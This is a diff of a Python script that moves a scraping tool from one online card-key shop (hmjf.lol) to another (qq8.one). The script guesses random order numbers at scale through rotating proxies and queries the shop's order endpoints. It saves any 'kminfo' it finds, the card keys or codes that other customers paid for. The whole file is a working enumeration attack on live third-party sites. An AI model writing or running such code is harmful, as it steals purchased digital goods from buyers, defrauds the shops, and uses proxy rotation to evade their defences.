@@ -1,14 +1,14 @@
 #!/usr/bin/env python3
-"""随机 trade_no 采样找已存在订单（比按秒全扫现实得多）"""
+"""qq8.one 随机 trade_no 采样（带 Cookie + 空响应重试）"""
 import json, os, random, re, subprocess, time
 from datetime import datetime, timedelta
 
-OUT = os.environ.get("HMJF_OUT", "/data/automation/results/hmjf.lol/kami_mine_20260716")
+OUT = os.environ.get("QQ8_OUT", "/data/automation/results/qq8.one/kami_deep_20260716")
 ENV = "/data/config/proxy.env"
 FETCH = "/data/automation/bin/qg-proxy-fetch.sh"
-BASE = "https://hmjf.lol/shop"
+BASE = "https://qq8.one"
 UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0"
-REF = "https://hmjf.lol/shop/"
+REF = "https://qq8.one/"
 os.makedirs(OUT, exist_ok=True)
 CK = f"{OUT}/.cookies"
 FOUND = f"{OUT}/paid_found.jsonl"
@@ -36,7 +36,7 @@ def refresh():
 
 def curl(url, post=None):
     global N, PX
-    for attempt in range(3):
+    for _ in range(3):
         N += 1
         if N % 100 == 0:
             refresh()
@@ -50,35 +50,32 @@ def curl(url, post=None):
             return raw
         refresh()
         time.sleep(0.5)
-    return raw
+    return ""
 
 def rand_tn():
     start = datetime(2025, 11, 1)
-    days = random.randint(0, 258)
-    d = start + timedelta(days=days)
-    h, m, s = random.randint(0, 23), random.randint(0, 59), random.randint(0, 59)
-    suf = random.randint(0, 999)
-    return f"{d.strftime('%Y%m%d')}{h:02d}{m:02d}{s:02d}{suf:03d}"
+    d = start + timedelta(days=random.randint(0, 258))
+    h, m, s = random.randint(8, 23), random.randint(0, 59), random.randint(0, 59)
+    return f"{d.strftime('%Y%m%d')}{h:02d}{m:02d}{s:02d}{random.randint(0, 999):03d}"
 
 def check(tn):
     sub = curl(f"{BASE}/other/submit.php?type=alipay&orderid={tn}")
-    if not sub.strip():
-        return None
-    if "该订单号不存在" in sub:
+    if not sub.strip() or "该订单号不存在" in sub:
         return None
     if "window.location" not in sub and "location.href" not in sub:
         return None
     gs = curl(f"{BASE}/other/getshop.php?trade_no={tn}")
     qh = curl(f"{BASE}/?mod=query&data={tn}")
+    qb = curl(f"{BASE}/ajax.php?act=query", f"type=1&qq={tn}")
     show = re.search(r"showOrder\s*\(\s*(\d+)\s*,\s*'([a-f0-9]{32})'", qh)
-    paid = "未付款" not in gs
     kminfo = None
+    paid = False
     try:
         j = json.loads(gs)
-        paid = bool(j.get("kminfo")) or j.get("msg") != "未付款"
         kminfo = j.get("kminfo")
+        paid = bool(kminfo) or j.get("msg") != "未付款"
     except Exception:
-        pass
+        paid = "未付款" not in gs
     oid, sk = (show.group(1), show.group(2)) if show else (None, None)
     if oid and sk:
         oh = curl(f"{BASE}/ajax.php?act=order", f"id={oid}&skey={sk}")
@@ -89,29 +86,27 @@ def check(tn):
                 paid = True
         except Exception:
             pass
-    rec = {"trade_no": tn, "paid": paid, "kminfo": kminfo, "id": oid, "skey": sk, "getshop": gs[:180]}
+    rec = {"trade_no": tn, "paid": paid, "kminfo": kminfo, "id": oid, "skey": sk,
+           "getshop": gs[:180], "query_ajax": qb[:180]}
     with open(FOUND, "a") as f:
         f.write(json.dumps(rec, ensure_ascii=False) + "\n")
-    tag = "PAID" if paid or kminfo else "EXIST"
-    log(f"*** {tag} {tn} paid={paid} kminfo={bool(kminfo)} id={oid}")
+    log(f"*** {'KMINFO' if kminfo else 'PAID' if paid else 'EXIST'} {tn}")
     if kminfo:
         with open(f"{OUT}/paid_hits.json", "a") as f:
             f.write(json.dumps(rec, ensure_ascii=False) + "\n")
     return rec
 
 def main():
-    curl(BASE + "/")  # init cookies
-    trials = int(os.environ.get("RANDOM_TRIALS", "80000"))
-    log(f"[start] trials={trials} {datetime.now().isoformat()}")
+    curl(BASE + "/")
+    trials = int(os.environ.get("RANDOM_TRIALS", "100000"))
+    log(f"[start qq8] trials={trials}")
     hits = 0
     for i in range(1, trials + 1):
-        tn = rand_tn()
-        r = check(tn)
-        if r:
+        if check(rand_tn()):
             hits += 1
         if i % 500 == 0:
             log(f"  progress {i}/{trials} hits={hits} req={N}")
-        time.sleep(0.05)
+        time.sleep(0.04)
     log(f"[done] hits={hits} req={N}")
     LOG.close()
 
